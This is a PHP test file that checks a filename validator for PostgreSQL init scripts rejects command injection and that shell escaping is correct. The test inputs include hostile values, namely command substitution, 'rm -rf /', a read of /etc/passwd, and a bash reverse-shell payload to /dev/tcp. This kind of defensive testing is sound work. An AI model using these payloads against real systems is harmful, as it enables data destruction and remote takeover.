<?php

/**
 * PostgreSQL Init Script Security Tests
 *
 * Tests to ensure PostgreSQL init script management is protected against
 * command injection attacks via malicious filenames.
 *
 * Related Issues: #3, #4 in security_issues.md
 * Related Files: app/Livewire/Project/Database/Postgresql/General.php
 */
test('postgresql init script rejects command injection in filename with command substitution', function () {
    expect(fn () => validateShellSafePath('test$(whoami)', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects command injection with semicolon', function () {
    expect(fn () => validateShellSafePath('test; rm -rf /', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects command injection with pipe', function () {
    expect(fn () => validateShellSafePath('test | whoami', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects command injection with backticks', function () {
    expect(fn () => validateShellSafePath('test`id`', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects command injection with ampersand', function () {
    expect(fn () => validateShellSafePath('test && whoami', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects command injection with redirect operators', function () {
    expect(fn () => validateShellSafePath('test > /tmp/evil', 'init script filename'))
        ->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('test < /etc/passwd', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects reverse shell payload', function () {
    expect(fn () => validateShellSafePath('test$(bash -i >& /dev/tcp/10.0.0.1/4444 0>&1)', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script escapes filenames properly', function () {
    $filename = "init'script.sql";
    $escaped = escapeshellarg($filename);

    expect($escaped)->toBe("'init'\\''script.sql'");
});

test('postgresql init script escapes special characters', function () {
    $filename = 'init script with spaces.sql';
    $escaped = escapeshellarg($filename);

    expect($escaped)->toBe("'init script with spaces.sql'");
});

test('postgresql init script accepts legitimate filenames', function () {
    expect(fn () => validateShellSafePath('init.sql', 'init script filename'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('01_schema.sql', 'init script filename'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('init-script.sh', 'init script filename'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('setup_db.sql', 'init script filename'))
        ->not->toThrow(Exception::class);
});
